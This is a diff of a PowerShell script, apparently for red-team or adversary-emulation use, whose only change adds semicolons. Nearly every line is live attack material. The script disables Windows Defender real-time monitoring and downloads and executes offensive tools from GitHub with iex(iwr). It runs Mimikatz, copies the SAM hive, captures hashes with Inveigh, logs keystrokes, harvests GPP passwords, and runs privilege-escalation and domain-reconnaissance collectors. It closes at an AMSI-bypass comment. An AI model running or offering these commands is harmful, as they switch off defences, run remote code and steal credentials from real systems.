@@ -1,36 +1,36 @@
 Set-MPPreference -DisableRealtimeMonitoring $true
 
 ############# admin privs required
-iex( iwr https://raw.githubusercontent.com/EmpireProject/Empire/7efb7eeaabeb3daf916ead7856bb621bbca331f4/data/module_source/credentials/Invoke-Mimikatz.ps1 -usebasicparsing)
+iex( iwr https://raw.githubusercontent.com/EmpireProject/Empire/7efb7eeaabeb3daf916ead7856bb621bbca331f4/data/module_source/credentials/Invoke-Mimikatz.ps1 -usebasicparsing);
 Invoke-Mimikatz
 
-iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1 -usebasicparsing)
+iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1 -usebasicparsing);
 Invoke-NinjaCopy -path C:\Windows\System32\config\SAM -LocalDestination $env:Temp\sam
 
 # requires AD Domain to capture hashes
-iex( iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 -usebasicparsing)
+iex( iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 -usebasicparsing);
 Invoke-Inveigh -ConsoleOutput Y
 
 ############# user context ok
-iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1 -usebasicparsing)
+iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1 -usebasicparsing);
 Get-Keystrokes
 cat $env:temp\key.log
 
 # requires AD Domain
-iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 -usebasicparsing)
+iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 -usebasicparsing);
 Get-GPPPassword
 
-iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -usebasicparsing)
+iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -usebasicparsing);
 Invoke-AllChecks
 
-iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -usebasicparsing)
+iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -usebasicparsing);
 Get-NetLocalGroupMember
 
 # requires AD Domain
-iex( iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -usebasicparsing)
+iex( iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -usebasicparsing);
 Invoke-BloodHound
 
-iex( iwr https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Gather/Get-Information.ps1 -usebasicparsing)
+iex( iwr https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Gather/Get-Information.ps1 -usebasicparsing);
 Get-Information -ErrorAction SilentlyContinue
 
 # amsi bypass
